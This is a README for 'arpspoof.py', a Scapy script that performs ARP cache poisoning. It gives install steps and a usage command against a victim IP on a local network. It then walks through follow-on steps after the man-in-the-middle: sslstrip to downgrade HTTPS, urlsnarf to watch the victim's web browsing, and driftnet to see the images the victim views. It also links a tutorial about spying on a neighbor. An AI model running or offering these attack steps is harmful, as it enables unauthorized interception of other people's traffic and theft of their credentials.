# arpspoof.py

This script uses Scapy to perform a simple Arp Cache Poisoning attack.

## Setup

First install system dependencies:

	# Fedora 22/23
	sudo dnf install python python-devel python-pip

	# Fedora 21/20/19/18 and CentosOS/REHL 7.1
	sudo yum install python python-devel python-pip

	# Ubuntu/Debian/Backtrack/Kali
	sudo apt-get install python python-dev python-pip

Then install Scapy:

	sudo pip install scapy

Here are some other cool tools that you can use once you have run the script
and created a MITM:

__sslstrip__

https://github.com/moxie0/sslstrip

__driftnet__

http://null-byte.wonderhowto.com/how-to/hack-like-pro-use-driftnet-see-what-kind-images-your-neighbor-looks-online-0154253/

__dsniff__

http://www.monkey.org/~dugsong/dsniff/

## Usage

To perform an arp cache poisoning attack against victim with ip address 192.168.2.75 with
gateway 192.168.2.1 (with interface wlan0):

	python arpspoof.py -i wlan0 -g 192.168.2.1 -t 192.168.2.75

Once you have a MITM, you can downgrade HTTPS traffic to HTTP by running sslstrip in another terminal:

	sslstrip -l 10000

To monitor the victim's web traffic in real time, use urlsnarf (part of dsniff) in another
temrinal:

	urlsnarf -i wlan0

To view all images currently being viewed by the victim, use driftnet in another terminal:

	driftnet

Stop attack by hitting ctrl+c in your arpspoof.py terminal then closing out of all other tools.
